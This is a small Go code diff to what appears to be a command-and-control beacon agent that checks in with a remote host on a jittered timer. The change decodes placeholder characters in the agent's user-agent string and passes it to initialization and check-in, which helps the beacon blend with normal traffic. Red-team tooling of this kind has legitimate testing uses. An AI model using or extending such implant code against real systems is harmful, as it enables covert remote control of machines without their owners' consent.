@@ -35,6 +35,9 @@ var (
 )
 
 func main() {
+	fixedAgent := strings.ReplaceAll(USERAGENT_FIXED, "////", ")")
+	fixedAgent = strings.ReplaceAll(fixedAgent, "****", "(")
+
 	sleep := SLEEP
 
 	nKeya, _ := strconv.ParseUint(sKeya, 10, 64)
@@ -59,7 +62,7 @@ func main() {
 	bKey = append(bKey, bKeyd...)
 
 	// initiliaze sessions
-	err := initialization.InitAgent(RHOST, RPORT, URI, sleep, JITTER, LISTENER_NAME, AgentID, USERAGENT, bKey, BEACON_NAME)
+	err := initialization.InitAgent(RHOST, RPORT, URI, sleep, JITTER, LISTENER_NAME, AgentID, fixedAgent, bKey, BEACON_NAME)
 	if err != nil {
 		fmt.Println(err)
 		os.Exit(1)
@@ -73,7 +76,7 @@ func main() {
 
 	// checkin with server based on ticker
 	for range ticker.C {
-		check.CheckIn(RHOST, RPORT, URI, &sleep, JITTER, LISTENER_NAME, AgentID, USERAGENT, bKey, BEACON_NAME)
+		check.CheckIn(RHOST, RPORT, URI, &sleep, JITTER, LISTENER_NAME, AgentID, fixedAgent, bKey, BEACON_NAME)
 		// change ticker if tasking changed sleep
 		ticker.Interval = time.Second * time.Duration(sleep)
 	}
